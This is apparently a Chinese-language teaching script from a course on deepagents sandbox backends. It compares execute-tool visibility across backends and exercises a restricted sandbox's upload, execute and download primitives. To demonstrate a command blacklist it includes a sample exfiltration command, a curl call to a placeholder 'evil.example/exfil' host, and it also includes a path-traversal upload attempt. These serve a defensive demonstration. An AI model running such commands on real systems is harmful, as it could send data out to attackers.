# ============================================================================
# 01_sandbox_nature.py —— ch10 段1：沙箱 Backend 的本质
#
#   Part A: 协议检测 → execute 工具可见性
#     同一句"运行 echo"，StateBackend 的 Agent 没有 execute 工具；
#     LocalShellBackend（实现了 SandboxBackendProtocol）的 Agent 才有。
#     这就是课程说的：模型调用前检查协议，满足才注入 execute。
#   Part B: 自定义受限沙箱（RestrictedSandbox）—— Provider 接入的核心
#     只实现 4 个原语（execute/upload_files/download_files/id），
#     附带教学安全策略：命令黑名单（模拟网络阻断）、输出截断、路径沙箱。
#
# ⚠️ 教学发现：BaseSandbox 的文件辅助方法用【绝对路径】构建脚本，
#    本地进程无法把沙箱根虚拟成 "/"（write('/x') 会真写系统根 → 只读报错）。
#    这正是真实沙箱用【容器】的原因：容器里的 "/" 就是沙箱根。
#    因此 Agent 级实验用 LocalShellBackend（自带虚拟路径映射），
#    RestrictedSandbox 做原语与策略的确定性演示。
# ============================================================================

import tempfile

from common import make_model, preview

from deepagents import create_deep_agent
from deepagents.backends import LocalShellBackend, StateBackend
from restricted_sandbox import RestrictedSandbox

# 阅读方式：Part A 看模型实际调用了什么；Part B 绕过模型，直接验证接口。
# LocalShellBackend 和 RestrictedSandbox 都在本机启动进程，不提供容器级隔离。
# virtual_mode 只影响文件工具的路径映射，不能限制 Shell 的绝对路径。


def part_a_execute_visibility():
    """对应原文 §1：同一句任务、更换 Backend，观察 execute 是否被调用。"""
    print("=" * 60)
    print("Part A: 协议检测 → execute 工具可见性")
    print("=" * 60)
    task = "用 execute 工具运行命令 `echo sandbox-ready`，把输出原样告诉我。"

    # 普通 Backend：只实现文件读写，没有 execute。
    # 模型回答“不能执行”属于正常结果；没有调用某工具本身不等于证明工具不存在，
    # 协议层的确定性判断可在 Part B 的 isinstance 检查中对照理解。
    print("  正在请求模型，对比两个 Backend…", flush=True)
    plain = create_deep_agent(model=make_model(), backend=StateBackend(),
                              system_prompt="你是助手，如实汇报可用能力。")
    r1 = plain.invoke({"messages": [{"role": "user", "content": task}]})
    # AIMessage.tool_calls 是模型发出的工具请求；不要只根据最终自然语言回复判断。
    called1 = [tc["name"] for m in r1["messages"] for tc in (getattr(m, "tool_calls", None) or [])]
    print(f"  [StateBackend] execute 被调用: {'execute' in called1}")
    print(f"  回复预览: {preview(r1['messages'][-1].content, 80)}")

    # 实现执行协议 → 可提供 execute。协议只描述能力，不保证运行环境真的隔离。
    # inherit_env=False 减少子进程继承的环境变量；不等于隔离宿主文件系统。
    root = tempfile.mkdtemp(prefix="sbx_a_")
    sandboxed = create_deep_agent(
        model=make_model(),
        backend=LocalShellBackend(root_dir=root, virtual_mode=True, inherit_env=False),
        system_prompt="你是编码助手，可以在沙箱中执行命令。",
    )
    r2 = sandboxed.invoke({"messages": [{"role": "user", "content": task}]})
    called2 = [tc["name"] for m in r2["messages"] for tc in (getattr(m, "tool_calls", None) or [])]
    print(f"  [LocalShellBackend] execute 被调用: {'execute' in called2}")
    print(f"  回复预览: {preview(r2['messages'][-1].content, 80)}")


def part_b_custom_sandbox_primitives():
    """对应原文 §10：上传字节 → 执行相对路径脚本 → 下载原始字节，全程无 LLM。"""
    print()
    print("=" * 60)
    print("Part B: RestrictedSandbox —— 实现 4 个原语即成为沙箱 Backend")
    print("=" * 60)
    sb = RestrictedSandbox(tempfile.mkdtemp(prefix="sbx_b_"))
    from deepagents.backends.protocol import SandboxBackendProtocol
    # isinstance 检查协议所需成员；它不检查安全隔离强度或实现的正确性。
    print(f"  符合执行协议: {isinstance(sb, SandboxBackendProtocol)}（期望 True）")
    print(f"  id: {sb.id}")

    # 原语1+2+3：upload → execute（相对路径）→ download 回环。
    # upload 的 /src/app.py 会映射到工作区/src/app.py；Shell 使用 cwd 下的 src/app.py。
    # content 用 bytes；每项返回值的 error=None 表示这一项传输成功。
    up = sb.upload_files([("/src/app.py", b"print('hi from restricted sandbox')\n")])
    print(f"  upload: error={up[0].error}")
    run = sb.execute("python3 src/app.py")
    print(f"  execute: exit={run.exit_code}, output={run.output.strip()!r}")
    down = sb.download_files(["/src/app.py"])
    print(f"  download: content={down[0].content!r}")

    # 策略1：仅演示字符串黑名单，不是真正断网；命令在 subprocess 启动前就被拒绝。
    # 不要据此推断 Python 网络库、DNS 等其他联网方式也被阻断。
    blocked = sb.execute("curl http://evil.example/exfil")
    print(f"  黑名单拦截: exit={blocked.exit_code}, {blocked.output[:58]!r}")

    # 策略2：路径沙箱（upload 穿越）
    esc = sb.upload_files([("../../escape.txt", b"x")])
    print(f"  路径穿越被拒: {esc[0].error!r}")

    # 策略3：日志记录“尝试过的命令”，被拒绝的命令也在其中，不表示实际运行过。
    print(f"  审计日志: {len(sb.commands_run)} 条 → {sb.commands_run[:2]}")

    print()
    print("  说明：真实 Provider（Daytona/Modal/E2B…）的对应关系——")
    print("    execute()   → 远程容器里跑 Shell（隔离边界由容器保证）")
    print("    upload/download → Provider 原生文件传输（两平面）")
    print("    id          → 沙箱实例标识（重连/审计用）")


if __name__ == "__main__":
    part_a_execute_visibility()
    part_b_custom_sandbox_primitives()
